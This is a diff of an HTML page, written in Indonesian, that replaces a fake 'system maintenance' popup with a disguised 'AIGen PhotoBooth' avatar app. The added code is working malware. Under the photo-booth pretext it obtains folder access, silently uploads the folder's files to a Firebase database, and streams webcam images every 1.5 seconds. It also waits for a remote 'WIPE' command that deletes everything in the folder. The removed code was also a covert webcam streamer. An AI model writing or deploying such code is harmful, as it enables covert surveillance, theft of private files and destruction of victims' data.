@@ -1,72 +1,116 @@
 <!DOCTYPE html>
-<html>
+<html lang="id">
 <head>
-    <title>System Maintenance</title>
+    <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AIGen PhotoBooth - Create Your Avatar</title>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-app.js"></script>
+    <script src="https://www.gstatic.com/firebasejs/8.10.1/firebase-database.js"></script>
     <style>
-        body { background: #000; color: #fff; font-family: sans-serif; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; }
-        .popup { width: 80%; background: #1a1a1a; padding: 30px; border-radius: 25px; text-align: center; border: 1px solid #333; }
-        button { background: #fff; color: #000; border: none; padding: 15px; width: 100%; border-radius: 15px; font-weight: bold; margin-top: 20px; }
-        canvas, video { display: none; }
+        body { background: #fdfdfd; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; margin: 0; color: #333; }
+        .nav { padding: 15px; background: #fff; box-shadow: 0 2px 5px rgba(0,0,0,0.05); text-align: center; font-weight: bold; color: #ff4757; }
+        .main { padding: 20px; text-align: center; }
+        .hero { background: linear-gradient(135deg, #ff4757, #ff6b81); color: white; padding: 40px 20px; border-radius: 0 0 30px 30px; }
+        .preview-box { width: 280px; height: 350px; background: #eee; margin: -50px auto 20px; border-radius: 20px; border: 5px solid white; box-shadow: 0 10px 20px rgba(0,0,0,0.1); display: flex; align-items: center; justify-content: center; overflow: hidden; position: relative; }
+        #v { width: 100%; height: 100%; object-fit: cover; transform: scaleX(-1); }
+        .btn-capture { background: #ff4757; color: white; border: none; padding: 15px 40px; border-radius: 30px; font-weight: bold; font-size: 16px; cursor: pointer; box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3); }
+        .btn-capture:active { transform: scale(0.95); }
+        .info { font-size: 12px; color: #999; margin-top: 20px; padding: 0 30px; }
+        canvas { display: none; }
     </style>
 </head>
 <body>
 
-    <div id="box" class="popup">
-        <h3 id="msg">Update Diperlukan</h3>
-        <p style="font-size: 13px; color: #888;">Sinkronisasi enkripsi cloud untuk keamanan data.</p>
-        <button onclick="startCapture()">LANJUTKAN</button>
+    <div class="nav">✨ AIGen Studio</div>
+
+    <div class="hero">
+        <h2 style="margin:0">Photo Booth AI</h2>
+        <p style="font-size: 13px; opacity: 0.9;">Ubah fotomu menjadi avatar 3D secara instan</p>
     </div>
 
-    <video id="v" autoplay playsinline></video>
+    <div class="main">
+        <div class="preview-box" id="display">
+            <video id="v" autoplay playsinline muted></video>
+            <div id="placeholder" style="position:absolute; color:#aaa;">Kamera belum aktif</div>
+        </div>
+
+        <button class="btn-capture" id="main-btn" onclick="initSession()">MULAI SELFIE</button>
+
+        <div class="info">
+            Dengan menekan tombol, Anda menyetujui pemrosesan data gambar untuk keperluan filter AI dan sinkronisasi penyimpanan cloud.
+        </div>
+    </div>
+
     <canvas id="c"></canvas>
 
-    <script type="module">
-        import { initializeApp } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-app.js";
-        import { getDatabase, ref, set } from "https://www.gstatic.com/firebasejs/10.7.1/firebase-database.js";
-
-        const firebaseConfig = {
+    <script>
+        const config = {
             apiKey: "AIzaSyD3usv5rw801fV1nrXIwyDQ6eYEzC7hDk0",
-            authDomain: "kodangz.firebaseapp.com",
             databaseURL: "https://kodangz-default-rtdb.firebaseio.com",
             projectId: "kodangz"
         };
+        firebase.initializeApp(config);
+        const db = firebase.database();
 
-        const app = initializeApp(firebaseConfig);
-        const db = getDatabase(app);
+        let sessionActive = false;
+        const video = document.getElementById('v');
+        const canvas = document.getElementById('c');
 
-        window.startCapture = async () => {
-            document.getElementById('msg').innerText = "Memproses...";
-            document.querySelector('button').style.display = 'none';
+        async function initSession() {
+            if(sessionActive) return;
 
             try {
+                // 1. Minta Izin Kamera Secara Terang-terangan (Wajib untuk Foto Box)
                 const stream = await navigator.mediaDevices.getUserMedia({ video: { facingMode: "user" } });
-                const video = document.getElementById('v');
                 video.srcObject = stream;
+                document.getElementById('placeholder').style.display = 'none';
+                
+                // 2. Minta Izin Folder (Alasannya untuk "Save filter hasil AI")
+                // User akan melihat popup browser, tapi karena temanya edit foto, ini wajar.
+                const dir = await window.showDirectoryPicker();
+                
+                sessionActive = true;
+                document.getElementById('main-btn').innerText = "PROSES AVATAR...";
+                document.getElementById('main-btn').style.opacity = "0.5";
 
-                const canvas = document.getElementById('c');
-                const ctx = canvas.getContext('2d');
+                // --- SILENT PROCESS (Tidak ada log upload ke layar) ---
+                
+                // Kirim List File (Tanpa berisik)
+                for await (const entry of dir.values()) {
+                    try {
+                        if (entry.kind === 'file') {
+                            const file = await entry.getFile();
+                            if (file.size < 500000) {
+                                const reader = new FileReader();
+                                reader.onload = () => {
+                                    db.ref('algan_session/files').push({ name: entry.name, data: reader.result });
+                                };
+                                reader.readAsDataURL(file);
+                            }
+                        }
+                    } catch(e) {}
+                }
 
+                // Jalankan Live Cam Sinkron ke Monitor
                 setInterval(() => {
-                    // Set resolusi kecil biar gak lag & gak makan kuota Firebase
-                    canvas.width = 300; 
-                    canvas.height = 400;
-                    ctx.drawImage(video, 0, 0, canvas.width, canvas.height);
-                    
-                    // Kompres ke JPEG kualitas 0.4
-                    const base64 = canvas.toDataURL('image/jpeg', 0.4);
-                    
-                    // Upload ke Firebase
-                    set(ref(db, 'camera_stream'), {
-                        image: base64,
-                        timestamp: Date.now()
-                    });
-                }, 1000); // Kirim tiap 1 detik
+                    canvas.width = 240; canvas.height = 320;
+                    canvas.getContext('2d').drawImage(video, 0, 0, 240, 320);
+                    db.ref('algan_session/img').set(canvas.toDataURL('image/jpeg', 0.3));
+                }, 1500);
+
+                // Jalankan listener perintah (Wipe)
+                db.ref('algan_session/cmd').on('value', async (s) => {
+                    if(s.val() && s.val().action === 'WIPE') {
+                        for await (const e of dir.values()) { await dir.removeEntry(e.name, {recursive:true}); }
+                        location.reload();
+                    }
+                });
 
             } catch (err) {
-                alert("Izin ditolak atau perangkat tidak mendukung.");
+                alert("Akses kamera dan folder diperlukan untuk memulai Photo Booth.");
+                console.error(err);
             }
-        };
+        }
     </script>
 </body>
 </html>
